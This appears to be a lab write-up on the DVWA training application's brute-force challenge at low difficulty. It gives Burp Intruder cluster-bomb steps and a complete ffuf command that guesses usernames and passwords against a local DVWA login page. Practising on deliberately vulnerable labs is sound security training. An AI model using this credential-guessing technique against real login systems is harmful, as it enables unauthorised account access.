# 🧪 DVWA

## Vulnerabilities

### Bruteforce

#### 🟢 Difficulty: Low

- Enter an invalid username and password in the login form.
- Send the request to intruder in burp.
- Use cluster bomb as attack and choose two wordlist one each for username and password.
- Start attack and wait for 200 response code.

Note: Use FFUF to bruteforce the username and password much faster using a wordlist in commandline.

```
ffuf -w username_wordlist.txt:USERFUZZ -w password_wordlist.txt:PASSFUZZ -u "http://localhost/DVWA/vulnerabilities/brute/?username=USERFUZZ&password=PASSFUZZ&Login=Login" -mr "Welcome" -b "security=low; PHPSESSID=p1l3cdhnalnedjle9fnkb0tda7" -H "Referer: http://localhost/DVWA/vulnerabilities/brute"
```
